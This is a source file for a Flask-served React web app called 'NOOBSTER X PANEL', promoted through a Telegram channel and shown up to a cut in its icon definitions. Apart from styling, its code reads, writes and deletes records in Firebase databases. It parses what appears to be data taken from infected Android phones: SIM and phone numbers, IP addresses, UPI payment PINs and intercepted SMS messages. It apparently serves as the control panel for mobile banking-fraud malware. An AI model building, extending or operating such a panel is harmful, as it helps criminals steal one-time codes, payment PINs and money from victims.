from flask import Flask, Response, request, jsonify
import os
import time

app = Flask(__name__)

ADMIN_PASSWORD = "Noobster@2024"
TELEGRAM_CHANNEL = "https://t.me/noobsterrr"
CONTACT_USERNAME = "@Noobstar9"

PAGE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
<title>NOOBSTER X PANEL</title>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
<style>
*, :before, :after { box-sizing: border-box; border: 0 solid; margin: 0; padding: 0; }
:root {
  --background: 0 0% 4%;
  --foreground: 0 0% 92%;
  --border: 0 0% 12%;
  --primary: 0 84% 50%;
  --radius: .75rem;
  --app-font-sans: "Inter", sans-serif;
  --app-font-mono: Menlo, monospace;
}
html, body {
  line-height: 1.5;
  font-family: "Inter", ui-sans-serif, system-ui, sans-serif;
  -webkit-tap-highlight-color: transparent;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
}
body {
  background-color: #020202;
  color: #e8e8e8;
  background:
    radial-gradient(at 0% 0%, rgba(59,130,246,0.12) 0px, transparent 50%),
    radial-gradient(at 100% 0%, rgba(139,92,246,0.12) 0px, transparent 50%),
    radial-gradient(at 50% 100%, rgba(6,182,212,0.08) 0px, transparent 50%),
    #020202;
  background-attachment: fixed;
}
button, input, textarea, select { font: inherit; color: inherit; background-color: transparent; border-radius: 0; }
img, svg { display: block; max-width: 100%; height: auto; }
ol, ul, menu { list-style: none; }
h1,h2,h3,h4,h5,h6 { font-size: inherit; font-weight: inherit; }
a { color: inherit; text-decoration: inherit; }

/* ============ UTILITY ============ */
.min-h-screen { min-height: 100vh; }
.flex { display: flex; }
.grid { display: grid; }
.hidden { display: none !important; }
.relative { position: relative; }
.fixed { position: fixed; }
.absolute { position: absolute; }
.inset-0 { inset: 0; }
.items-center { align-items: center; }
.items-start { align-items: flex-start; }
.items-end { align-items: flex-end; }
.justify-center { justify-content: center; }
.justify-between { justify-content: space-between; }
.flex-col { flex-direction: column; }
.flex-wrap { flex-wrap: wrap; }
.flex-1 { flex: 1; }
.flex-shrink-0 { flex-shrink: 0; }
.gap-1 { gap: .25rem; }
.gap-1\.5 { gap: .375rem; }
.gap-2 { gap: .5rem; }
.gap-2\.5 { gap: .625rem; }
.gap-3 { gap: .75rem; }
.gap-4 { gap: 1rem; }
.gap-5 { gap: 1.25rem; }
.gap-6 { gap: 1.5rem; }
.p-1 { padding: .25rem; }
.p-1\.5 { padding: .375rem; }
.p-2 { padding: .5rem; }
.p-2\.5 { padding: .625rem; }
.p-3 { padding: .75rem; }
.p-4 { padding: 1rem; }
.p-5 { padding: 1.25rem; }
.p-6 { padding: 1.5rem; }
.p-7 { padding: 1.75rem; }
.px-2 { padding-inline: .5rem; }
.px-3 { padding-inline: .75rem; }
.px-4 { padding-inline: 1rem; }
.px-5 { padding-inline: 1.25rem; }
.px-6 { padding-inline: 1.5rem; }
.py-1 { padding-block: .25rem; }
.py-1\.5 { padding-block: .375rem; }
.py-2 { padding-block: .5rem; }
.py-2\.5 { padding-block: .625rem; }
.py-3 { padding-block: .75rem; }
.py-4 { padding-block: 1rem; }
.py-8 { padding-block: 2rem; }
.py-12 { padding-block: 3rem; }
.py-24 { padding-block: 6rem; }
.pt-2 { padding-top: .5rem; }
.pt-4 { padding-top: 1rem; }
.mt-1 { margin-top: .25rem; }
.mt-2 { margin-top: .5rem; }
.mt-3 { margin-top: .75rem; }
.mt-4 { margin-top: 1rem; }
.mt-6 { margin-top: 1.5rem; }
.mt-10 { margin-top: 2.5rem; }
.mb-1 { margin-bottom: .25rem; }
.mb-2 { margin-bottom: .5rem; }
.mb-3 { margin-bottom: .75rem; }
.mb-4 { margin-bottom: 1rem; }
.mb-5 { margin-bottom: 1.25rem; }
.mb-6 { margin-bottom: 1.5rem; }
.mb-8 { margin-bottom: 2rem; }
.ml-auto { margin-left: auto; }
.ml-2 { margin-left: .5rem; }
.mx-auto { margin-inline: auto; }
.w-full { width: 100%; }
.w-1\.5 { width: .375rem; }
.w-2 { width: .5rem; }
.w-3 { width: .75rem; }
.w-3\.5 { width: .875rem; }
.w-4 { width: 1rem; }
.w-5 { width: 1.25rem; }
.w-6 { width: 1.5rem; }
.w-7 { width: 1.75rem; }
.w-8 { width: 2rem; }
.w-9 { width: 2.25rem; }
.w-10 { width: 2.5rem; }
.w-16 { width: 4rem; }
.w-20 { width: 5rem; }
.w-80 { width: 20rem; }
.w-96 { width: 24rem; }
.w-px { width: 1px; }
.h-1\.5 { height: .375rem; }
.h-2 { height: .5rem; }
.h-3 { height: .75rem; }
.h-3\.5 { height: .875rem; }
.h-4 { height: 1rem; }
.h-5 { height: 1.25rem; }
.h-6 { height: 1.5rem; }
.h-7 { height: 1.75rem; }
.h-8 { height: 2rem; }
.h-9 { height: 2.25rem; }
.h-10 { height: 2.5rem; }
.h-16 { height: 4rem; }
.h-20 { height: 5rem; }
.h-80 { height: 20rem; }
.h-96 { height: 24rem; }
.h-full { height: 100%; }
.max-w-md { max-width: 28rem; }
.max-w-lg { max-width: 32rem; }
.max-w-2xl { max-width: 42rem; }
.max-w-4xl { max-width: 56rem; }
.max-w-screen-2xl { max-width: 96rem; }
.max-h-52 { max-height: 13rem; }
.max-h-96 { max-height: 24rem; }
.rounded { border-radius: .25rem; }
.rounded-lg { border-radius: .5rem; }
.rounded-xl { border-radius: .75rem; }
.rounded-2xl { border-radius: 1rem; }
.rounded-3xl { border-radius: 1.5rem; }
.rounded-full { border-radius: 9999px; }
.border { border: 1px solid hsl(var(--border)); }
.border-b { border-bottom: 1px solid hsl(var(--border)); }
.border-l { border-left: 1px solid hsl(var(--border)); }
.border-t { border-top: 1px solid hsl(var(--border)); }
.border-dashed { border-style: dashed; }
.text-center { text-align: center; }
.text-right { text-align: right; }
.text-left { text-align: left; }
.text-xs { font-size: .75rem; }
.text-sm { font-size: .875rem; }
.text-base { font-size: 1rem; }
.text-lg { font-size: 1.125rem; }
.text-xl { font-size: 1.25rem; }
.text-2xl { font-size: 1.5rem; }
.text-3xl { font-size: 1.875rem; }
.text-4xl { font-size: 2.25rem; }
.text-\[9px\] { font-size: 9px; }
.text-\[10px\] { font-size: 10px; }
.text-\[11px\] { font-size: 11px; }
.font-medium { font-weight: 500; }
.font-semibold { font-weight: 600; }
.font-bold { font-weight: 700; }
.font-black { font-weight: 900; }
.font-mono { font-family: var(--app-font-mono); }
.uppercase { text-transform: uppercase; }
.italic { font-style: italic; }
.tracking-tight { letter-spacing: -.025em; }
.tracking-wider { letter-spacing: .05em; }
.tracking-widest { letter-spacing: .1em; }
.truncate { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.whitespace-nowrap { white-space: nowrap; }
.break-all { word-break: break-all; }
.overflow-hidden { overflow: hidden; }
.overflow-y-auto { overflow-y: auto; }
.overflow-x-auto { overflow-x: auto; }
.cursor-pointer { cursor: pointer; }
.select-none { user-select: none; }
.select-all { user-select: all; }
.opacity-30 { opacity: .3; }
.opacity-50 { opacity: .5; }
.opacity-70 { opacity: .7; }
.text-white { color: #fff; }
.text-black { color: #000; }
.text-red-300 { color: #fca5a5; }
.text-red-400 { color: #f87171; }
.text-red-500 { color: #ef4444; }
.text-emerald-400 { color: #4ade80; }
.text-emerald-500 { color: #22c55e; }
.text-emerald-600 { color: #16a34a; }
.text-blue-400 { color: #60a5fa; }
.text-blue-500 { color: #3b82f6; }
.text-purple-400 { color: #c084fc; }
.text-amber-400 { color: #fbbf24; }
.text-yellow-500 { color: #eab308; }
.text-orange-400 { color: #fb923c; }
.text-\[\#6acfff\] { color: #6acfff; }
.text-\[\#333\] { color: #333; }
.text-\[\#444\] { color: #444; }
.text-\[\#555\] { color: #555; }
.text-\[\#666\] { color: #666; }
.text-\[\#777\] { color: #777; }
.text-\[\#888\] { color: #888; }
.text-\[\#aaa\] { color: #aaa; }
.text-\[\#ccc\] { color: #ccc; }
.bg-black { background-color: #000; }
.bg-white\/5 { background-color: rgba(255,255,255,0.05); }
.bg-white\/10 { background-color: rgba(255,255,255,0.1); }
.bg-red-600 { background-color: #dc2626; }
.bg-red-950\/20 { background-color: rgba(69,10,10,0.2); }
.bg-red-950\/30 { background-color: rgba(69,10,10,0.3); }
.bg-red-950\/40 { background-color: rgba(69,10,10,0.4); }
.bg-emerald-500 { background-color: #22c55e; }
.bg-emerald-500\/10 { background-color: rgba(34,197,94,0.1); }
.bg-emerald-500\/15 { background-color: rgba(34,197,94,0.15); }
.bg-emerald-950\/20 { background-color: rgba(2,44,34,0.2); }
.bg-emerald-950\/30 { background-color: rgba(2,44,34,0.3); }
.bg-purple-500\/10 { background-color: rgba(168,85,247,0.1); }
.bg-purple-500\/15 { background-color: rgba(168,85,247,0.15); }
.bg-purple-950\/20 { background-color: rgba(59,7,100,0.2); }
.bg-amber-500\/10 { background-color: rgba(245,158,11,0.1); }
.bg-blue-950\/60 { background-color: rgba(23,37,84,0.6); }
.bg-black\/70 { background-color: rgba(0,0,0,0.7); }
.bg-black\/80 { background-color: rgba(0,0,0,0.8); }
.bg-\[\#0a0a0a\] { background-color: #0a0a0a; }
.bg-\[\#0a0a0a\]\/80 { background-color: rgba(10,10,10,0.8); }
.bg-\[\#080808\] { background-color: #080808; }
.bg-\[\#0a130d\] { background-color: #0a130d; }
.bg-\[\#0a1410\] { background-color: #0a1410; }
.bg-\[\#100d18\] { background-color: #100d18; }
.bg-\[\#0d0d0d\] { background-color: #0d0d0d; }
.bg-\[\#111\] { background-color: #111; }
.bg-\[\#111111\] { background-color: #111; }
.bg-\[\#131313\] { background-color: #131313; }
.bg-\[\#151515\] { background-color: #151515; }
.bg-\[\#1a1a1a\] { background-color: #1a1a1a; }
.bg-\[\#222\] { background-color: #222; }
.bg-\[\#0f0a1a\] { background-color: #0f0a1a; }
.bg-\[\#081410\] { background-color: #081410; }
.border-\[\#1a1a1a\] { border-color: #1a1a1a; }
.border-\[\#1f1f1f\] { border-color: #1f1f1f; }
.border-\[\#222\] { border-color: #222; }
.border-\[\#262626\] { border-color: #262626; }
.border-\[\#333\] { border-color: #333; }
.border-\[\#2a2a2a\] { border-color: #2a2a2a; }
.border-emerald-500\/25 { border-color: rgba(34,197,94,0.25); }
.border-emerald-900\/30 { border-color: rgba(6,78,59,0.3); }
.border-emerald-900\/40 { border-color: rgba(6,78,59,0.4); }
.border-purple-500\/25 { border-color: rgba(168,85,247,0.25); }
.border-purple-900\/30 { border-color: rgba(88,28,135,0.3); }
.border-red-900\/30 { border-color: rgba(127,29,29,0.3); }
.border-amber-500\/20 { border-color: rgba(245,158,11,0.2); }
.border-blue-800\/60 { border-color: rgba(30,64,175,0.6); }
.border-transparent { border-color: transparent; }
.border-l-emerald-500\/70 { border-left-color: rgba(34,197,94,0.7); }
.border-l-purple-500\/70 { border-left-color: rgba(168,85,247,0.7); }
.border-l-red-500\/60 { border-left-color: rgba(239,68,68,0.6); }
.shadow-lg { box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -4px rgba(0,0,0,0.1); }
.shadow-xl { box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 8px 10px -6px rgba(0,0,0,0.1); }
.shadow-2xl { box-shadow: 0 25px 50px -12px rgba(0,0,0,0.25); }
.shadow-red-900\/40 { box-shadow: 0 10px 15px -3px rgba(127,29,29,0.4); }
.shadow-red-900\/50 { box-shadow: 0 20px 25px -5px rgba(127,29,29,0.5); }
.backdrop-blur-md { backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); }
.backdrop-blur-sm { backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); }
.blur-3xl { filter: blur(64px); }
.transition { transition: all .15s ease; }
.transition-all { transition: all .15s ease; }
.duration-200 { transition-duration: .2s; }
.duration-300 { transition-duration: .3s; }
.duration-500 { transition-duration: .5s; }
.animate-pulse { animation: pulse 2s infinite; }
.animate-spin { animation: spin 1s linear infinite; }
.animate-fade-in { animation: fadeIn 1s ease-out forwards; }
.animate-glint { animation: glint 1.5s infinite; box-shadow: 0 0 6px #6acfff, 0 0 10px #0088cc; }
.animate-fade-up { animation: fadeUp .3s ease-out; }
@keyframes spin { to { transform: rotate(360deg); } }
@keyframes pulse { 50% { opacity: .5; } }
@keyframes fadeIn { 0% { opacity: 0; transform: translateY(10px) scale(0.98); filter: blur(2px); } 100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); } }
@keyframes glint { 0%,100% { transform: scale(1); opacity: 0; } 50% { transform: scale(1.5); opacity: 1; } }
@keyframes fadeUp { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
.red-gradient { background: linear-gradient(135deg, #dc2626, #c2410c); }
.glass-card { backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); background: rgba(17,17,17,0.9); border: 1px solid rgba(255,255,255,0.06); }
.grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
.grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); }
.grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); }
@media (min-width: 640px) { .sm\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } .sm\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } }
@media (min-width: 1024px) { .lg\:grid-cols-2 { grid-template-columns: repeat(2, minmax(0, 1fr)); } .lg\:grid-cols-3 { grid-template-columns: repeat(3, minmax(0, 1fr)); } .lg\:grid-cols-4 { grid-template-columns: repeat(4, minmax(0, 1fr)); } }
.line-clamp-2 { display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
.tabular-nums { font-variant-numeric: tabular-nums; }
.z-0 { z-index: 0; }
.z-10 { z-index: 10; }
.z-40 { z-index: 40; }
.z-50 { z-index: 50; }
.sticky { position: sticky; }
.top-0 { top: 0; }
.bottom-6 { bottom: 1.5rem; }
.left-1\/2 { left: 50%; }
.-translate-x-1\/2 { transform: translateX(-50%); }
.-translate-y-1\/2 { transform: translateY(-50%); }
.top-1\/2 { top: 50%; }
.left-3 { left: .75rem; }
.right-2 { right: .5rem; }
.right-4 { right: 1rem; }
.right-1\/4 { right: 25%; }
.left-1\/4 { left: 25%; }
.bottom-0 { bottom: 0; }
.-top-1 { top: -.25rem; }
.-right-1 { right: -.25rem; }
.focus\:border-red-500:focus { border-color: #ef4444; }
.focus\:ring-2:focus { box-shadow: 0 0 0 2px rgba(239,68,68,0.2); }
.outline-none { outline: none; }
.outline-none:focus { outline: none; }
.placeholder\:text-\[\#444\]::placeholder { color: #444; }
.hover\:border-\[\#2a2a2a\]:hover { border-color: #2a2a2a; }
.hover\:border-\[\#333\]:hover { border-color: #333; }
.hover\:border-red-600\/40:hover { border-color: rgba(220,38,38,0.4); }
.hover\:bg-\[\#0a0a0a\]:hover { background-color: #0a0a0a; }
.hover\:bg-\[\#161616\]:hover { background-color: #161616; }
.hover\:bg-white\/5:hover { background-color: rgba(255,255,255,0.05); }
.hover\:bg-white\/10:hover { background-color: rgba(255,255,255,0.1); }
.hover\:bg-red-950\/20:hover { background-color: rgba(69,10,10,0.2); }
.hover\:bg-red-900\/60:hover { background-color: rgba(127,29,29,0.6); }
.hover\:bg-red-700:hover { background-color: #b91c1c; }
.hover\:text-white:hover { color: #fff; }
.hover\:text-\[\#888\]:hover { color: #888; }
.hover\:text-red-400:hover { color: #f87171; }
.hover\:opacity-90:hover { opacity: .9; }
.disabled\:opacity-50:disabled { opacity: .5; }
.disabled\:cursor-not-allowed:disabled { cursor: not-allowed; }
.pointer-events-none { pointer-events: none; }

/* 3D Telegram Popup */
#telegramPopup {
  position: fixed; inset: 0;
  background: rgba(0,0,0,0.55);
  backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
  display: flex; justify-content: center; align-items: center;
  z-index: 99999; padding: 20px;
}
.popup-box {
  width: 100%; max-width: 380px;
  padding: 38px 28px 40px; border-radius: 40px;
  text-align: center; color: #fff;
  background: radial-gradient(circle at 30% 20%, #2b9cff, #0f5b9e 80%, #083b6b);
  box-shadow: 0 40px 70px rgba(0,0,0,0.7), 0 15px 30px rgba(0,0,0,0.5), inset 0 4px 12px rgba(255,255,255,0.5), inset 0 -6px 18px rgba(0,20,40,0.8), 0 0 0 2px rgba(255,255,255,0.08) inset;
  transform: perspective(1200px) rotateX(6deg) rotateY(2deg) translateZ(10px);
  animation: popup3d 0.7s cubic-bezier(0.23,1,0.32,1) forwards;
  position: relative; overflow: hidden;
}
@keyframes popup3d {
  0% { opacity: 0; transform: perspective(1200px) rotateX(40deg) rotateY(10deg) scale(0.7) translateZ(-80px); filter: blur(8px); }
  100% { opacity: 1; transform: perspective(1200px) rotateX(6deg) rotateY(2deg) scale(1) translateZ(10px); filter: blur(0); }
}
.popup-box h2 { font-size: 26px; font-weight: 700; margin-bottom: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap; }
.popup-box .sub-icon { font-size: 34px; }
.popup-box p {
  color: #e3f0ff; font-size: 17px; margin: 10px 0 22px;
  background: rgba(0,30,60,0.2); border-radius: 40px; padding: 14px 16px;
  border: 1px solid rgba(255,255,255,0.08);
}
.join-btn {
  display: inline-block; margin-top: 6px; padding: 16px 34px;
  background: linear-gradient(145deg, #ffffff, #e0ecff);
  color: #0066aa; font-weight: 700; font-size: 18px;
  border-radius: 60px; border: none; cursor: pointer;
  box-shadow: 0 16px 28px -6px rgba(0,0,0,0.6), inset 0 2px 8px rgba(255,255,255,0.9);
}
.join-btn::before { content: "✈️ "; font-size: 22px; margin-right: 8px; }
.popup-close-btn {
  position: absolute; top: 14px; right: 18px;
  background: rgba(255,255,255,0.15); border: none; color: #fff;
  font-size: 20px; width: 32px; height: 32px; border-radius: 50%;
  cursor: pointer; display: flex; align-items: center; justify-content: center;
  z-index: 10;
}

#root { min-height: 100vh; }
</style>
</head>
<body>
<div id="root"></div>

<div id="telegramPopup" onclick="if(event.target === this) this.style.display='none';">
  <div class="popup-box">
    <button class="popup-close-btn" onclick="document.getElementById('telegramPopup').style.display='none';" aria-label="Close">&times;</button>
    <h2><span class="sub-icon">📱</span> JOIN TELEGRAM CHANNEL</h2>
    <p>Get The New Pannel<br /></p>
    <a class="join-btn" href="https://t.me/noobsterrr" target="_blank" onclick="document.getElementById('telegramPopup').style.display='none';">⚡ JOIN ⚡</a>
  </div>
</div>

<script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
<script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
<script>
// =============================================================
// ALL CODE (React 18, no build step)
// =============================================================
const { useState, useEffect, useCallback, useMemo, useRef, Fragment } = React;
const e = React.createElement;

// ---------- LocalStorage ----------
const LS = {
  get: (k, def) => { try { const v = localStorage.getItem(k); return v ? JSON.parse(v) : def; } catch { return def; } },
  set: (k, v) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} },
  del: (k) => { try { localStorage.removeItem(k); } catch {} }
};

// Keys
const K_ADMIN        = "nb_admin_session";
const K_ACCOUNTS     = "nb_firebase_accounts";
const K_APIKEYS      = "nb_api_keys";
const K_PANELSTATUS  = "nb_panel_status";
const K_STARRED      = "nb_starred";

// ---------- Constants (injected by Python) ----------
const CFG = {
  ADMIN_PASSWORD: "__ADMIN_PASSWORD__",
  CONTACT_USERNAME: "__CONTACT_USERNAME__",
  TELEGRAM_CHANNEL: "__TELEGRAM_CHANNEL__"
};

// ---------- Firebase ----------
async function fbFetch(url, key, path, params = {}) {
  let u = (url || "").trim().replace(/\/$/, "");
  if (!u.startsWith("http")) u = "https://" + u;
  if (!u.includes("firebaseio.com") && !u.includes("firebasedatabase.app")) {
    throw new Error("Invalid Firebase URL");
  }
  const qs = new URLSearchParams({ auth: (key || "").trim(), ...params });
  const full = u + "/" + path + ".json?" + qs.toString();
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 15000);
  let res;
  try { res = await fetch(full, { signal: ctrl.signal }); }
  catch (err) { clearTimeout(timer); throw new Error("Network: " + err.message); }
  clearTimeout(timer);
  if (!res.ok) {
    if (res.status === 401 || res.status === 403) throw new Error("PERMISSION_DENIED");
    if (res.status === 404) return null;
    throw new Error("HTTP " + res.status);
  }
  return res.json();
}
async function fbPut(url, key, path, data) {
  const u = url.replace(/\/$/, "");
  const res = await fetch(u + "/" + path + ".json?auth=" + key, {
    method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
  });
  if (!res.ok) throw new Error("HTTP " + res.status);
  return res.json();
}
async function fbDelete(url, key, path) {
  const u = url.replace(/\/$/, "");
  const res = await fetch(u + "/" + path + ".json?auth=" + key, { method: "DELETE" });
  if (!res.ok && res.status === 403) throw new Error("PERMISSION_DENIED");
}

// ---------- Parsers ----------
function parseDevices(data) {
  const out = [];
  if (!data || typeof data !== "object") return out;
  Object.entries(data).forEach(([id, d]) => {
    if (!d || typeof d !== "object") return;
    let sims = Array.isArray(d.sims) ? d.sims : (d.sims && typeof d.sims === "object" ? Object.values(d.sims) : []);
    const battery = String(d.battery ?? "—");
    out.push({
      id, name: String(d.modelName || d.model || d.deviceName || id),
      battery, batteryPercent: parseInt(battery.replace("%", "")) || 0,
      status: !!d.status,
      phoneNumber: String(d.mobNo || (sims[0] && sims[0].phoneNumber) || "—"),
      android: String(d.androidV || d.androidVersion || "—"),
      ip: String(d.ip_address || "—"),
      storage: String(d.storage || "—"),
      provider: String(d.service_provider || "—"),
      sims,
      upipin: d.upipin ? String(d.upipin) : null,
      cpu: String(d.cpu_arch || "—"),
      sdk: String(d.sdkV || "—"),
      lastSeen: d.lastSeen || d.last_seen || d.lastOnline || d.last_online || d.lastActive || d.last_active || d.timestamp || null
    });
  });
  return out;
}
function parseMessages(data) {
  const out = [];
  if (!data || typeof data !== "object") return out;
  Object.entries(data).slice(-150).forEach(([, m]) => {
    if (!m || typeof m !== "object") return;
    const text = String(m.message || m.body || m.text || "");
    if (!text.trim()) return;
    out.push({ text, sender: String(m.sender || m.from || "Unknown"), time: String(m.dateTime || m.date || "") });
  });
  return out.reverse();
}
function fmtCurrency(v) {
  try { return parseFloat(v).toLocaleString("en-IN", { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
  catch { return v; }
}
function timeAgo(ms) {
  if (!ms) return "—";
  const diff = Date.now() - ms;
  if (diff < 0) return "Just now";
  const s = Math.floor(diff / 1000), m = Math.floor(s / 60), h = Math.floor(m / 60), d = Math.floor(h / 24);
  if (s < 60) return s + "s ago";
  if (m < 60) return m + "m ago";
  if (h < 24) return h + "h " + (m % 60) + "m ago";
  if (d < 30) return d + "d " + (h % 24) + "h ago";
  return new Date(ms).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });
}
function fmtExpiry(ms) {
  if (!ms) return "Never";
  return new Date(ms).toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });
}
function daysLeft(ms) {
  if (!ms) return null;
  return Math.ceil((ms - Date.now()) / (1000 * 60 * 60 * 24));
}

// ---------- Icons ----------
const Icon = ({ name, size = 16, className = "" }) => {
  const P = {
    wifi: e(Fragment, null, e("path", { d: "M12 20h.01" }), e("path", { d: "M2 8.82a15 15 0 0 1 20 0" }), e("path", { d: "M5 12.859a10 10 0 0 1 14 0" }), e("path", { d: "M8.5 16.429a5 5 0 0 1 7 0" })),
    zap: e("path", { d: "M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z" }),
    copy: e(Fragment, null, e("rect", { width: 14, height: 14, x: 8, y: 8, rx: 2 }), e("path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2" })),
    check: e("path", { d: "M20 6 9 17l-5-5" }),
    x: e(Fragment, null, e("path", { d: "M18 6 6 18" }), e("path", { d: "m6 6 12 12" })),
    plus: e(Fragment, null, e("path", { d: "M5 12h14" }), e("path", { d: "M12 5v14" })),
    trash: e(Fragment, null, e("path", { d: "M10 11v6" }), e("path", { d: "M14 11v6" }), e("path", { d: "M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6" }), e("path", { d: "M3 6h18" }), e("path", { d: "M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2" })),
    link: e(Fragment, null, e("path", { d: "M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" }), e("path", { d: "M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" })),
    share: e(Fragment, null, e("circle", { cx: 18, cy: 5, r: 3 }), e("circle", { cx: 6, cy: 12, r: 3 }), e("circle", { cx: 18, cy: 19, r: 3 }), e("line", { x1: 8.59, x2: 15.42, y1: 13.51, y2: 17.49 }), e("line", { x1: 15.41, x2: 8.59, y1: 6.51, y2: 10.49 })),
    search: e(Fragment, null, e("circle", { cx: 11, cy: 11, r: 8 }), e("path", { d: "m21 21-4.3-4.3" })),
    refresh: e(Fragment, null, e("path", { d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" }), e("path", { d: "M21 3v5h-5" }), e("path", { d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" }), e("path", { d: "M8 16H3v5" })),
    logout: e(Fragment, null, e("path", { d: "m16 17 5-5-5-5" }), e("path", { d: "M21 12H9" }), e("path", { d: "M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4" })),
    shield: e("path", { d: "M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" }),
    clock: e(Fragment, null, e("path", { d: "M12 6v6l4 2" }), e("circle", { cx: 12, cy: 12, r: 10 })),
    rupee: e(Fragment, null, e("path", { d: "M6 3h12" }), e("path", { d: "M6 8h12" }), e("path", { d: "m6 13 8.5 8" }), e("path", { d: "M6 13h3" }), e("path", { d: "M9 13c6.667 0 6.667-10 0-10" })),
    card: e(Fragment, null, e("rect", { width: 20, height: 14, x: 2, y: 5, rx: 2 }), e("line", { x1: 2, x2: 22, y1: 10, y2: 10 })),
    send: e(Fragment, null, e("path", { d: "M14.536 21.686a.5.5 0 0 0 .937-.024l6.5-19a.496.496 0 0 0-.635-.635l-19 6.5a.5.5 0 0 0-.024.937l7.93 3.18a2 2 0 0 1 1.112 1.11z" }), e("path", { d: "m21.854 2.147-10.94 10.939" })),
    phone: e("path", { d: "M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384" }),
    msg: e("path", { d: "M22 17a2 2 0 0 1-2 2H6.828a2 2 0 0 0-1.414.586l-2.202 2.202A.71.71 0 0 1 2 21.286V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2z" }),
    alert: e(Fragment, null, e("path", { d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3" }), e("path", { d: "M12 9v4" }), e("path", { d: "M12 17h.01" })),
    eye: e(Fragment, null, e("path", { d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" }), e("circle", { cx: 12, cy: 12, r: 3 })),
    eyeoff: e(Fragment, null, e("path", { d: "M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" }), e("path", { d: "M14.084 14.158a3 3 0 0 1-4.242-4.242" }), e("path", { d: "M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" }), e("path", { d: "m2 2 20 20" })),
    trendup: e(Fragment, null, e("path", { d: "M16 7h6v6" }), e("path", { d: "m22 7-8.5 8.5-5-5L2 17" })),
    trenddown: e(Fragment, null, e("path", { d: "M16 17h6v-6" }), e("path", { d: "m22 17-8.5-8.5-5 5L2 7" })),
    chevron: e("path", { d: "m9 18 6-6-6-6" }),
    star: e("path", { d: "M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z" }),
    key: e(Fragment, null, e("circle", { cx: 7.5, cy: 15.5, r: 5.5 }), e("path", { d: "m21 2-9.6 9.6" }), e("path", { d: "m15.5 7.5 3 3L22 7l-3-3" })),
    database: e(Fragment, null, e("ellipse", { cx: 12, cy: 5, rx: 9, ry: 3 }), e("path", { d: "M3 5V19A9 3 0 0 0 21 19V5" }), e("path", { d: "M3 12A9 3 0 0 0 21 12" })),
    power: e(Fragment, null, e("path", { d: "M12 2v10" }), e("path", { d: "M18.4 6.6a9 9 0 1 1-12.77.04" })),
